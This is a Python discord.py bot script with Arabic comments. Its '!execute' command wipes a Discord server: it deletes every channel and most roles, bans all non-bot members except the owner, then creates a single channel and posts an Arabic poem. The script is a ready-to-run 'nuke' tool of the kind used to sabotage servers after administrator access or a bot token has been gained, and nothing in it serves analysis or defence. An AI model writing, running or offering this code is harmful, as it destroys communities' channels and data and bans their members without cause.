import discord
from discord.ext import commands
import asyncio

# إعدادات الصلاحيات الكاملة
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# النص المطلوب نشره
MESSAGE_CONTENT = """
الوجه بلوجه والنيه بنيه
والي يدور على الزله بيلقاها

علمني الوقت معلومه اساسيه
ان بعض البشر ماتبي الا من يتوطاها
"""

@bot.event
async def on_ready():
    print(f'تم تسجيل الدخول بنجاح كـ: {bot.user.name}')
    print('البوت جاهز لتنفيذ الأوامر..')

@bot.command()
@commands.has_permissions(administrator=True)
async def execute(ctx):
    guild = ctx.guild
    
    print(f"بدء العمل على سيرفر: {guild.name}")

    # 1. حذف جميع الرومات (Channels)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"تم حذف القناة: {channel.name}")
        except:
            continue

    # 2. حذف جميع الرتب (Roles) - باستثناء رتبة البوت نفسها و @everyone
    for role in guild.roles:
        try:
            if role.name != "@everyone" and role.managed == False:
                await role.delete()
                print(f"تم حذف الرتبة: {role.name}")
        except:
            continue

    # 3. حظر جميع الأعضاء (Mass Ban)
    for member in guild.members:
        try:
            if not member.bot and member != guild.owner:
                await member.ban(reason="تطهير")
                print(f"تم حظر: {member.name}")
        except:
            continue

    # 4. إنشاء الروم الجديد باسم M
    new_channel = await guild.create_text_channel('𝑴')
    
    # 5. إرسال النص المطلوب
    await new_channel.send(MESSAGE_CONTENT)
    print("تمت العملية بنجاح!")

# ضع التوكن الخاص بك هنا
bot.run('YOUR_TOKEN_HERE')
